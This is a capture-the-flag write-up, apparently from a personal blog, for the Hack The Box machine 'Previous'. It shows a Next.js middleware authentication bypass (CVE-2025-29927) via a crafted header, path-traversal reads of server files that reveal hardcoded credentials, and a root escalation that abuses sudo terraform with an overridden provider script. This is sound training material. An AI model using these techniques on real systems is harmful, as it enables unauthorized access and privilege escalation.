<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>HTB - Previous :: squ4r00t&#39;s</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Writeup for the &#39;Medium&#39; rated machine: Previous" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/htb/previous/" />


  





  
  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/header.min.b246f77a68a20a42410f6ef10f5a4c0355e44a1e6161b71356c92d912d3ad1d2.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/main.min.2b8cac7ecb4eaf88191c1f3696aa0642a060b51a860216ac63ce253fb11ff3da.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="icon" type="image/png" href="/img/favicons/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/svg+xml" href="/img/favicons/favicon.svg" />
<link rel="shortcut icon" href="/img/favicons/favicon.ico" />
<link rel="apple-touch-icon" sizes="180x180" href="/img/favicons/apple-touch-icon.png" />
<link rel="manifest" href="/img/favicons/site.webmanifest" />


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB - Previous">
<meta property="og:description" content="Writeup for the &#39;Medium&#39; rated machine: Previous" />
<meta property="og:url" content="http://localhost:1313/htb/previous/" />
<meta property="og:site_name" content="squ4r00t&#39;s" />

  <meta property="og:image" content="http://localhost:1313/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2026-01-09 00:00:00 &#43;0000 UTC" />














</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    
    
    
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/posts">Blog</a></li>
        
      
        
          <li><a href="/htb">HTB</a></li>
        
      
        
          <li><a href="/portswigger">Portswigger</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/posts" >Blog</a></li>
        
      
        
          <li><a href="/htb" >HTB</a></li>
        
      
        
          <li><a href="/portswigger" >Portswigger</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/htb/previous/">HTB - Previous</a>
  </h1>
  <div class="post-meta"><time class="post-date">2026-01-09</time></div>

  
    <span class="post-tags">
      
      #<a href="http://localhost:1313/tags/htb/">htb</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/linux/">linux</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/medium/">medium</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/nextjs/">nextjs</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/middleware/">middleware</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/authentication_bypass/">authentication_bypass</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/cve-2025-29927/">CVE-2025-29927</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/terraform/">terraform</a>&nbsp;
      
    </span>
  
  
  <img src="/htb/previous/cover.png"
    class="post-cover"
    alt="HTB - Previous"
    title="Cover Image" />


  
    <div class="table-of-contents">
      <h2>
        Table of Contents
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#port-scanning">Port Scanning</a></li>
    <li><a href="#website-port-80">Website: Port 80</a>
      <ul>
        <li><a href="#authentication-bypass">Authentication Bypass</a></li>
        <li><a href="#local-file-read">Local File Read</a></li>
      </ul>
    </li>
    <li><a href="#foothold-as-jeremy">Foothold as jeremy</a></li>
    <li><a href="#privesc">Privesc</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>This machine starts with a nextjs website that is found vulnerable to <code>CVE-2025-29927</code>. Exploiting this, we are to bypass authentication and access an api endpoint that allows us to read local files on the server. This is leveraged to retrieve the password of the user jeremy and login to the box. This user is able to run the terraform binary with sudo, this can be exploited in order to get root access to the box.</p>
<h2 id="port-scanning">Port Scanning<a href="#port-scanning" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Fri Jan  9 22:45:49 2026 as: nmap -A -T4 -p- -oN nmap_tcp 10.129.242.162</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.242.162
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.044s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://previous.htb/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Fri Jan  9 22:50:15 2026 -- 1 IP address (1 host up) scanned in 266.83 seconds</span>
</span></span></code></pre></div><h2 id="website-port-80">Website: Port 80<a href="#website-port-80" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Navigating to <code>http://10.129.242.162</code> redirects us to <code>previous.htb</code></p>
<figure><img src="/img/htb/previous/redirect_to_previous_htb.png"
    alt="Redirected to previous.htb"><figcaption>
      <p>Redirected to previous.htb</p>
    </figcaption>
</figure>

<p>Let&rsquo;s add it to our host file and go back again:</p>
<figure><img src="/img/htb/previous/homepage.png"
    alt="Homepage"><figcaption>
      <p>Homepage</p>
    </figcaption>
</figure>

<p>Based on the information on this page, the website seems to make use of middleware. Clicking on &ldquo;Get Started&rdquo; presents us with a login form:</p>
<figure><img src="/img/htb/previous/login_form.png"
    alt="Login Form"><figcaption>
      <p>Login Form</p>
    </figcaption>
</figure>

<p>The <code>X-Powered-By</code> header indicates that the server is running Next.js:</p>
<figure><img src="/img/htb/previous/running_next_js.png"
    alt="Running Next.js"><figcaption>
      <p>Running Next.js</p>
    </figcaption>
</figure>

<p>So far we know that:</p>
<ul>
<li>The server is running <code>Next.js</code></li>
<li>It uses middleware</li>
<li>And there is some authentication that we need to bypass</li>
</ul>
<h3 id="authentication-bypass">Authentication Bypass<a href="#authentication-bypass" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Looking for vulnerabilities on <code>Next.js</code>, we find <a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">this research (Next.js and the corrupt middleware: the authorizing artifact)</a> from <a href="https://x.com/zhero___">zhero</a> that lead to <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29927">CVE-2025-29927</a>.</p>
<p>This vulnerability allows bypassing authorization checks within a Next.js application, if the authorization check occurs in middleware.</p>
<p>In the blog post, more specifically in <a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware#section-3-2">Section 3.2: Max recursion depth</a>, we see that we need to send the <code>x-middleware-subrequest</code> header set to a colon seperated list of the string &ldquo;middleware&rdquo; repeated at least 5 times (which is the <code>MAX_RECURSION_DEPTH</code>). Simply put, we have to send this header:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
</span></span></span></code></pre></div><p>To set the header, we can use Burp Match &amp; Replace, or <a href="https://addons.mozilla.org/en-US/firefox/addon/headers/">this extension</a> in firefox:</p>
<figure><img src="/img/htb/previous/setting_subreq_header.png"
    alt="Setting the x-middleware-subrequest header with the firefox extension"><figcaption>
      <p>Setting the x-middleware-subrequest header with the firefox extension</p>
    </figcaption>
</figure>

<p>After setting the header, if we go back to the homepage and click started, we are directed to <code>/docs</code> without needing to authenticate:</p>
<figure><img src="/img/htb/previous/got_to_docs.png"
    alt="Authentication Bypass successful"><figcaption>
      <p>Authentication Bypass successful</p>
    </figcaption>
</figure>

<h3 id="local-file-read">Local File Read<a href="#local-file-read" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Going to <code>/docs/examples</code>, we get a link to download an example HelloWorld script at <code>/api/download?example=hello-world.ts</code>:</p>
<figure><img src="/img/htb/previous/potential_lfi.png"
    alt="Potential LFI ??"><figcaption>
      <p>Potential LFI ??</p>
    </figcaption>
</figure>

<p>Let&rsquo;s try accessing other files with this:</p>
<figure><img src="/img/htb/previous/lfi_etc_passwd.png"
    alt="Can read local file /etc/passwd"><figcaption>
      <p>Can read local file /etc/passwd</p>
    </figcaption>
</figure>

<p>As we can see, we are able to read other files in the system via path traversal. Since this is a next js application, we should start enumerating the project&rsquo;s directory to gain more information. Looking at the <code>package.json</code>, we see that the app is using <a href="https://next-auth.js.org/">next-auth</a>:</p>
<figure><img src="/img/htb/previous/lfi_package_json.png"
    alt="next-auth in package.json"><figcaption>
      <p>next-auth in package.json</p>
    </figcaption>
</figure>

<p>One place we can look at is the <a href="https://next-auth.js.org/configuration/providers/credentials">Credentials Provider</a> as it might contain sensitive information:</p>
<figure><img src="/img/htb/previous/cred_provider.png"
    alt="Found Hardcoded credentials!"><figcaption>
      <p>Found Hardcoded credentials!</p>
    </figcaption>
</figure>

<h2 id="foothold-as-jeremy">Foothold as jeremy<a href="#foothold-as-jeremy" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>With the password we found, we can login via ssh as <code>jeremy</code> and retrieve the user flag:</p>
<figure><img src="/img/htb/previous/user.png"
    alt="User Flag Retrieved !"><figcaption>
      <p>User Flag Retrieved !</p>
    </figcaption>
</figure>

<h2 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Our current user <code>jeremy</code> can run terraform as root:</p>
<figure><img src="/img/htb/previous/jeremy_sudo_terraform.png"
    alt="Jeremy sudo privileges"><figcaption>
      <p>Jeremy sudo privileges</p>
    </figcaption>
</figure>

<p>To exploit this, we first need to:</p>
<ul>
<li>Create a directory, here I will create <code>/home/jeremy/exploit_dir</code></li>
<li>In this directory create a bash script with the filename <code>terraform-provider-examples_v0.1_linux_amd64</code>. This script will be executed as root.</li>
<li>Finally copy the <code>.terraformrc</code> config present in <code>/home/jeremy</code>, and change <code>/usr/local/go/bin</code> to <code>/home/jeremy/exploit_dir</code></li>
</ul>
<p>After that, we can simply call the binary while setting the <code>TF_CLI_CONFIG_FILE</code> variable to our modified config file. Here is the full attack to retrieve the root flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jeremy@previous:~$ ls
</span></span><span class="line"><span class="cl">docker  exploit_dir  exploit_terraformrc  user.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jeremy@previous:~$ cat exploit_terraformrc
</span></span><span class="line"><span class="cl">provider_installation <span class="o">{</span>
</span></span><span class="line"><span class="cl">        dev_overrides <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;previous.htb/terraform/examples&#34;</span> <span class="o">=</span> <span class="s2">&#34;/home/jeremy/exploit_dir&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        direct <span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jeremy@previous:~$ ls exploit_dir/
</span></span><span class="line"><span class="cl">terraform-provider-examples_v0.1_linux_amd64
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jeremy@previous:~$ cat exploit_dir/terraform-provider-examples_v0.1_linux_amd64
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">cp /root/root.txt /home/jeremy/root.txt
</span></span><span class="line"><span class="cl">chown jeremy:jeremy /home/jeremy/root.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jeremy@previous:~$ <span class="nv">TF_CLI_CONFIG_FILE</span><span class="o">=</span>exploit_terraformrc sudo /usr/bin/terraform -chdir<span class="se">\=</span>/opt/examples apply
</span></span><span class="line"><span class="cl">╷
</span></span><span class="line"><span class="cl">│ Warning: Provider development overrides are in effect
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">│ The following provider development overrides are <span class="nb">set</span> in the CLI configuration:
</span></span><span class="line"><span class="cl">│  - previous.htb/terraform/examples in /home/jeremy/exploit_dir
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
</span></span><span class="line"><span class="cl">╵
</span></span><span class="line"><span class="cl">╷
</span></span><span class="line"><span class="cl">│ Error: Failed to load plugin schemas
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">│ Error <span class="k">while</span> loading schemas <span class="k">for</span> plugin components: Failed to obtain provider schema: Could not load the schema <span class="k">for</span> provider previous.htb/terraform/examples: failed to
</span></span><span class="line"><span class="cl">│ instantiate provider <span class="s2">&#34;previous.htb/terraform/examples&#34;</span> to obtain schema: Unrecognized remote plugin message:
</span></span><span class="line"><span class="cl">│ Failed to <span class="nb">read</span> any lines from plugin<span class="err">&#39;</span>s stdout
</span></span><span class="line"><span class="cl">│ This usually means
</span></span><span class="line"><span class="cl">│   the plugin was not compiled <span class="k">for</span> this architecture,
</span></span><span class="line"><span class="cl">│   the plugin is missing dynamic-link libraries necessary to run,
</span></span><span class="line"><span class="cl">│   the plugin is not executable by this process due to file permissions, or
</span></span><span class="line"><span class="cl">│   the plugin failed to negotiate the initial go-plugin protocol handshake
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">│ Additional notes about plugin:
</span></span><span class="line"><span class="cl">│   Path: /home/jeremy/exploit_dir/terraform-provider-examples_v0.1_linux_amd64
</span></span><span class="line"><span class="cl">│   Mode: -rwxrwxr-x
</span></span><span class="line"><span class="cl">│   Owner: <span class="m">1000</span> <span class="o">[</span>jeremy<span class="o">]</span> <span class="o">(</span>current: <span class="m">0</span> <span class="o">[</span>root<span class="o">])</span>
</span></span><span class="line"><span class="cl">│   Group: <span class="m">1000</span> <span class="o">[</span>jeremy<span class="o">]</span> <span class="o">(</span>current: <span class="m">0</span> <span class="o">[</span>root<span class="o">])</span>
</span></span><span class="line"><span class="cl">│ ..
</span></span><span class="line"><span class="cl">╵
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jeremy@previous:~$ ls
</span></span><span class="line"><span class="cl">docker  exploit_dir  exploit_terraformrc  root.txt  user.txt
</span></span><span class="line"><span class="cl">jeremy@previous:~$ cat root.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>REDACTED<span class="o">]</span>
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
